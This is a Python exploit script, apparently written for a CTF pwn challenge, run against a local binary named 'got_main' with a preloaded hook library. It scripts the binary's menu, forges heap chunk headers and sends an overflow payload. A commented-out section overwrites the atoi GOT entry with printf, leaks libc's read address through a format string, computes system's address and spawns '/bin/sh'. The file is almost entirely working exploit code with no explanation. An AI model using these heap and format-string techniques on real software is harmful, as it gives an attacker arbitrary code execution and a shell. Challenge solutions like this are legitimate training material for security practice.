from zio import *
from time import *
libc_file_path = "./libhook.so"
p = zio("./got_main",env={"LD_PRELOAD":libc_file_path})

printf_plt = 0x400B60  
atoi_got = 0x6050C8
read_got = 0x605070
#offset = lib.symbols['read'] - lib.symbols['system']
offset = 0x7ffff78ccab0 - 0x7ffff78cd7c0
edit_addr = 0x605130
def add(name,member,words,length,solider,allay,Lannister=0):
	p.read_until("Start a war")
	p.writeline("1")
	#p.interactive()
        p.read_until("(y/n)")
	if Lannister==1:
		p.writeline("y")
	else:
		p.writeline("n")
		p.read_until("name")
		#ss = raw_input()
		p.write(name)
		p.read_until("members")
		#ss = raw_input()
		p.writeline(str(member))
		p.read_until("Family Words")
		p.write(words)
	p.read_until("you get?")
	p.writeline(str(length))
	p.read_until("soliders")
	p.write(solider)
	p.read_until("ally")
	p.write(allay)
def edit(id,length,content):
	p.read_until("Start a war")
	p.writeline("3")
	p.read_until("give me your id")
	p.writeline(str(id))
	p.read_until("you get?")
	#ss = raw_input()
	p.writeline(str(length))
	p.read_until("soliders")

	p.write(content)
def buy(id,op):
	p.read_until("Start a war")
	p.writeline("2")
	p.read_until("your id")
	p.writeline(str(id))
	p.read_until("price:5000000")
	p.writeline(str(op))
def war():
	p.read_until("Start a war")
	p.writeline("4")
def hack(id,content):
	p.read_until("Start a war")
	sleep(0.5)
	p.writeline("1024")
	p.read_until("input your id")
	p.writeline(str(id))
	p.read_until("say to Death?")
	p.write(content)

p.read_until("3.exit")
p.writeline("1")

fake_chunk = "a"*0x30 + b64(0x0) + b64(0xb1) + "a"*0x10
add("\x00" + '\x01'*20,-2147483647,"c"*46,0x50,fake_chunk,"b"*0x30)
add("\x00" + '\x01'*20,-2147483647,"c"*46,0x10,"d\n","a"*0x10 + b64(0x0) + b64(0x21) +"\n")
buy(0,2)
buy(1,1)
#ss = raw_input()
war()

payload = "Not today\x00"
payload += "a"*0x2
payload += b64(0) + b64(0x61)
payload += (0x55 - len(payload))*"\x50"

hack(1,payload)
# sleep(3)

# #ss = raw_input()
# payload = "a" * 0x38 + b64(atoi_got)
# payload += (0x50 - len(payload))*"a"
# add("\x00" + '\x01'*20,-2147483647,"c"*46,0x50,payload,"b"*0x30)

# edit(1,8,b64(printf_plt))
# p.read_until("Start a war")
# p.writeline("pppp%7$s" + b64(read_got))
# p.read_until("pppp")
# read_addr = u64(p.recv(6).ljust(8,"\x00"))
# #system_addr = read_addr - (libc.symbols['read'] - libc.symbols['system'])
# system_addr = read_addr - offset
# log.success("read address = " + hex(read_addr))
# log.success("system address = " + hex(system_addr))
# payload = "%7$npppp" + b64(edit_addr)
# p.read_until("Start a war")
# p.writeline(payload)
# p.read_until("Start a war")
# p.writeline("aaa")
# p.read_until("give me your id")
# p.writeline("1")
# p.read_until("you get?")
# #ss = raw_input()
# p.writeline("8"*8)
# p.read_until("soliders")
# p.write(b64(system_addr))
# p.read_until("Start a war")
# p.writeline("/bin/sh\x00")
p.interact()




